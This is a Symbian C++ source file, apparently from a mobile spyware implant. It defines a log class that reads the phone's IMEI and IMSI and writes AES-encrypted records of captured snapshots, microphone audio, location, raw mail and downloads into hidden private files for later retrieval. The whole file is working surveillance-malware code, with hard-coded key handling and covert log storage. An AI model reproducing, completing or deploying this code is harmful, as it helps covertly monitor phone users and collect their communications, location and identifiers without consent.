/*
 ============================================================================
 Name		: LogFile.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CLogFile implementation
 ============================================================================
 */

#include <HT\LogFile.h>
#include "AdditionalDataStructs.h"
#include <HT\FileUtils.h>
#include <bautils.h>
#include <HT\TimeUtils.h>

//#include <PathInfo.h>   // TODO: remove whene done

#define LOG_VERSION_01 0x77B1822D   // (UINT)2008121901

struct TLogStruct
	{
	TUint32 iVersion;
	TUint32 iLogType;
	TUint32 iHiTimestamp;
	TUint32 iLoTimestamp;
	TUint32 iDeviceLen;
	TUint32 iUserIdLen;
	TUint32 iSourceIdLen;
	TUint32 iAdditionalDataLen;

	inline TLogStruct()
		{
		}
	inline TLogStruct(TUint32 logType, TUint32 hiTime, TUint32 loTime, TUint32 imeiLen, TUint32 imsiLen) :
		iVersion(LOG_VERSION_01), iLogType(logType), iHiTimestamp(hiTime), iLoTimestamp(loTime), iDeviceLen(imeiLen),
				iUserIdLen(imsiLen), iSourceIdLen(0), iAdditionalDataLen(0)
		{
		}
	};



#include <HT\AES.h>

CLogFile::CLogFile(RFs& aFs) : iFs(aFs)
	{
	// No implementation required
	}

EXPORT_C CLogFile::~CLogFile()
	{
	CloseLogL();
	}

EXPORT_C CLogFile* CLogFile::NewLC(RFs& aFs)
	{
	CLogFile* self = new (ELeave) CLogFile(aFs);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

EXPORT_C CLogFile* CLogFile::NewL(RFs& aFs)
	{
	CLogFile* self = CLogFile::NewLC(aFs);
	CleanupStack::Pop(); // self;
	return self;
	}

void CLogFile::ConstructL()
	{
	// no implementation required...
	}


void CLogFile::RetrieveImeiAndImsiL()
	{
	// Retrieve them only the first time this is called, then keeps valid the cached copy.
	if (iImei.Length() > 0)
		return;

	CPhone* phone = CPhone::NewLC();
	phone->GetImeiSync(iImei);
	phone->GetImsiSync(iImsi);
	CleanupStack::PopAndDestroy();
	}


EXPORT_C void CLogFile::CreateLogL(TInt aLogId)
	{
	iLogId = aLogId;
	RetrieveImeiAndImsiL();
	
	TFullName path;
	FileUtils::CompleteWithPrivatePathL(iFs, path);

	//TFullName path = PathInfo::PhoneMemoryRootPath();
	
	TFullName filename;
	iFile.Temp(iFs, path, filename, EFileWrite | EFileStream | EFileShareAny);
	iOpened = ETrue;

	TTime now;
	now.UniversalTime();
	TInt64 fileTime = TimeUtils::GetFiletime(now);
	//fileTime = GetFiletime();
	TUint32 hiTime = (fileTime >> 32);
	TUint32 loTime = (fileTime & 0xFFFFFFFF);
	
	TLogStruct logStruct(aLogId, hiTime, loTime, iImei.Size(), iImsi.Size());
		
	TInt structAndDataLen = sizeof(TLogStruct) + iImei.Size() + iImsi.Size();

	// Create buffer for data
	RBuf8 toEncrypt;
	toEncrypt.Create(structAndDataLen);
	toEncrypt.CleanupClosePushL();

	// Append the LogStruct
	const TUint8* ptr = (const TUint8 *) &logStruct;
	toEncrypt.Append(ptr, sizeof(TLogStruct));

	// Append the LogStruct Data	
	toEncrypt.Append((TUint8 *)iImei.Ptr(), iImei.Size());
	toEncrypt.Append((TUint8 *)iImsi.Ptr(),iImsi.Size());

	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
		
	// Encrypt the buffer:   AES[LogStruct + Data + Padding]
	RBuf8 encrypted(AES::EncryptL(toEncrypt, KIV, hexaKey.Left(K_KEY_SIZE)));
	encrypted.CleanupClosePushL();

	// Write to file:   Len + AES[LogStruct + Data + Padding]
	TUint32 len=encrypted.Length();
	TBuf8<4> lenBuf;
	lenBuf.Append((const TUint8 *) &len, 4);
	iFile.Write(lenBuf);
	iFile.Write(encrypted);
	CleanupStack::PopAndDestroy(&encrypted);
	CleanupStack::PopAndDestroy(&toEncrypt);
	}

EXPORT_C void CLogFile::CreateLogL(TInt aLogId, TAny* aAdditionalData)
	{
	iLogId = aLogId;
	RetrieveImeiAndImsiL();
	
	TFullName path;
	FileUtils::CompleteWithPrivatePathL(iFs, path);

	TFullName filename;
	iFile.Temp(iFs, path, filename, EFileWrite | EFileStream | EFileShareAny);
	iOpened = ETrue;

	TTime now;
	now.UniversalTime();
	TInt64 fileTime;
	//fileTime = GetFiletime();
	fileTime = TimeUtils::GetFiletime(now);
	TUint32 hiTime = (fileTime >> 32);
	TUint32 loTime = (fileTime & 0xFFFFFFFF);
	
	TInt structAndDataLen;
	TLogStruct logStruct(aLogId, hiTime, loTime, iImei.Size(), iImsi.Size());
	if(aLogId == LOGTYPE_SNAPSHOT){
		logStruct.iAdditionalDataLen = sizeof(TSnapshotAdditionalData); 
	}
	else if (aLogId == LOGTYPE_MIC){
		logStruct.iAdditionalDataLen = sizeof(TMicAdditionalData);
	}
	else if (aLogId == LOGTYPE_LOCATION_NEW) {
		logStruct.iAdditionalDataLen = sizeof(TLocationAdditionalData); 
	}
	else if (aLogId == LOGTYPE_MAIL_RAW) {
		logStruct.iAdditionalDataLen = sizeof(TMailRawAdditionalData);
	}
	else if (aLogId == LOGTYPE_DOWNLOAD) {
		TDownloadAdditionalData* addData = reinterpret_cast<TDownloadAdditionalData*>(aAdditionalData);
		logStruct.iAdditionalDataLen = sizeof(addData->uVersion) +sizeof(addData->uFileNamelen)+addData->uFileNamelen; 
	}

	structAndDataLen = sizeof(TLogStruct) + iImei.Size() + iImsi.Size() + logStruct.iAdditionalDataLen; 

	// Create buffer for data
	RBuf8 toEncrypt;
	toEncrypt.Create(structAndDataLen);
	toEncrypt.CleanupClosePushL();

	// Append the LogStruct
	const TUint8* ptr = (const TUint8 *) &logStruct;
	toEncrypt.Append(ptr, sizeof(TLogStruct));

	// Append the LogStruct Data	
	toEncrypt.Append((TUint8 *)iImei.Ptr(), iImei.Size());
	toEncrypt.Append((TUint8 *)iImsi.Ptr(),iImsi.Size());

	// Append the AdditionalData
	ptr = (const TUint8 *)aAdditionalData;
	if(aLogId == LOGTYPE_SNAPSHOT)
		toEncrypt.Append(ptr, sizeof(TSnapshotAdditionalData));
	else if (aLogId == LOGTYPE_MIC)
		toEncrypt.Append(ptr, sizeof(TMicAdditionalData));
	else if (aLogId == LOGTYPE_LOCATION_NEW)
		toEncrypt.Append(ptr, sizeof(TLocationAdditionalData));
	else if (aLogId == LOGTYPE_MAIL_RAW)
		toEncrypt.Append(ptr,sizeof(TMailRawAdditionalData));
	else if (aLogId == LOGTYPE_DOWNLOAD)
		{
		//we have to avoid 16 byte alignment
		TDownloadAdditionalData* addData = reinterpret_cast<TDownloadAdditionalData*>(aAdditionalData);
		toEncrypt.Append(ptr,8);  //8=uVersion|uFilenameLen
		toEncrypt.Append((TUint8 *)addData->fileName.Ptr(),addData->fileName.Size());  
		}
	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
		
	// Encrypt the buffer:   AES[LogStruct + Data + Padding]
	RBuf8 encrypted(AES::EncryptL(toEncrypt, KIV, hexaKey.Left(K_KEY_SIZE)));
	encrypted.CleanupClosePushL();

	// Write to file:   Len + AES[LogStruct + Data + Padding]
	TUint32 len=encrypted.Length();
	TBuf8<4> lenBuf;
	lenBuf.Append((const TUint8 *) &len, 4);
	iFile.Write(lenBuf);
	iFile.Write(encrypted);
	CleanupStack::PopAndDestroy(&encrypted);
	CleanupStack::PopAndDestroy(&toEncrypt);
	}

EXPORT_C void CLogFile::AppendLogL(const TDesC8& aData)
	{
/*	// Pad data Chunk to KeySize (16)
	TUint32 paddedLen = aData.Length() + K_KEY_SIZE - 1;
	paddedLen = paddedLen - (paddedLen % K_KEY_SIZE);

	RBuf8 paddedData;
	paddedData.CleanupClosePushL();
	paddedData.Create(paddedLen);
	paddedData.Append(aData);
	paddedData.AppendFill(0, paddedLen - aData.Length());

	// Not needed... AES will add the padding...
*/
	
	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
		
	// Encrypt padded data Chunk
	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey.Left(K_KEY_SIZE)));
	if(encrypted.Size()>0)  //added jo'
		{
		encrypted.CleanupClosePushL();

		// Write to file:   Len + AES[Data + Padding]
		TUint32 dataLen = aData.Length();
		TBuf8<4> lenBuf;
		lenBuf.Append((const TUint8 *) &dataLen, 4);
		iFile.Write(lenBuf);
		iFile.Write(encrypted);
		iContainsData = ETrue;
		CleanupStack::PopAndDestroy(&encrypted);
		}
//	CleanupStack::PopAndDestroy(&paddedData);
	}

EXPORT_C void CLogFile::CloseLogL()
	{
	if (!iOpened)
		return;
	iOpened = EFalse;
	TFullName filename;	
	iFile.FullName(filename);
	if (!iContainsData)
		{
		// If the log files doesn't contain any data, just delete it.
		iFile.Close();
		iFs.Delete(filename);
		return;
		}
	
	// The new name of the file will be: <LOGID_> <TmpFileName> <.log>
	TParsePtr parsePath(filename);	
	TFullName destFilename = parsePath.DriveAndPath();
	destFilename.AppendNum(iLogId, EHex);
	destFilename.Append('_');
	destFilename.Append( parsePath.Name() );
	destFilename.Append(_L(".log"));
	
	// Eventually close the file and rename it.
	iFile.Close();
	iFs.Rename(filename, destFilename);
	iContainsData = EFalse;
	}


/*
 * A filetime is a 64-bit value that represents the number of 100-nanosecond intervals 
 * that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC).
 * Please also note that in defining KInitialTime the month and day values are offset from zero.
 * 
 */
/*
TInt64 CLogFile::GetFiletime(){
	
	_LIT(KInitialTime,"16010000:000000");
	TTime currentTime;
	currentTime.UniversalTime();
	TTime initialTime;
	initialTime.Set(KInitialTime);
		
	TTimeIntervalMicroSeconds interval;
	interval=currentTime.MicroSecondsFrom(initialTime);
		
	return (interval.Int64())*10; 
		
}
*/
void CLogFile::WriteMarkupL(TInt aId, const TDesC8& aData)
	{
	TFullName filename;
	filename.AppendNum(aId);
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	RFile markupFile;
	markupFile.Replace(iFs, filename, EFileWrite | EFileStream | EFileShareExclusive);
	
	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
	
	RBuf8 encrypted(AES::EncryptL(aData, KIV, hexaKey.Left(K_KEY_SIZE)));
	encrypted.CleanupClosePushL();
	//markupFile.Write(aData);
	markupFile.Write(encrypted);
	markupFile.Close();
	CleanupStack::PopAndDestroy(&encrypted);
			
	}

TBool CLogFile::ExistsMarkupL(TInt aId)
	{
	TFullName filename;
	filename.AppendNum(aId);
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	return BaflUtils::FileExists(iFs, filename);
	}

HBufC8* CLogFile::ReadMarkupL(TInt aId)
	{
	TFullName filename;
	filename.AppendNum(aId);
	FileUtils::CompleteWithPrivatePathL(iFs, filename);
	//return FileUtils::ReadFileContentsL(iFs, filename);
	return DecryptMarkupL(iFs, filename);
	}

HBufC8* CLogFile::DecryptMarkupL(RFs& fs,const TDesC& fname)
	{

	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_LOGS_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
				
	__FLOG(_L8("DecryptMarkupL Begin"));
	/*
	if (!BaflUtils::FileExists(fs, fname))
		return HBufC8::NewL(0);
	 */
	HBufC8* buf = FileUtils::ReadFileContentsL(fs, fname);
	CleanupStack::PushL(buf);

	// Diff + AES[Len + Data + CRC]

	// removes Diff
	// buf->Des().Delete(0, 8);

	__FLOG(_L8("AES::DecryptL() Begin"));
	//RBuf8 plain(AES::DecryptL(buf->Des(), KIV, KAES_CONFIG_KEY));
	RBuf8 plain(AES::DecryptL(buf->Des(), KIV, hexaKey));
	plain.CleanupClosePushL();
	__FLOG(_L8("AES::DecryptL() End"));

	if (plain.Length() == 0)
		{
		CleanupStack::PopAndDestroy(&plain);
		CleanupStack::Pop(buf);
		buf->Des().SetLength(0);
		return buf;
		}

	
	TUint32 len = 0;
	Mem::Copy(&len, plain.Ptr(), 4);
	__FLOG_1(_L8("Len:%d"), len);

	// If these checks fails, it means that the file has not been decrypted correctly 
	if (len < 8 || len > plain.MaxLength())
		{
		CleanupStack::PopAndDestroy(&plain);
		CleanupStack::Pop(buf);
		buf->Des().SetLength(0);
		return buf;
		}
	
	// Removes unneeded data from the end (AES padding)
	__FLOG_1(_L8("Len:%d"), plain.Length());
	plain.SetLength(len);

	// Removes Len from the beginning
	plain.Delete(0, 4);
	buf->Des().Copy(plain);
			
	CleanupStack::PopAndDestroy(&plain);
	CleanupStack::Pop(buf);
	__FLOG(_L8("DecryptMarkupL End"));
	return buf;
	}

/*
void CLogFile::LogInfoL(const TDesC& aLogInfoMsg)
	{
	CreateLogL(LOGTYPE_INFO);
	AppendLogL(aLogInfoMsg);
	CloseLogL();
	}
*/
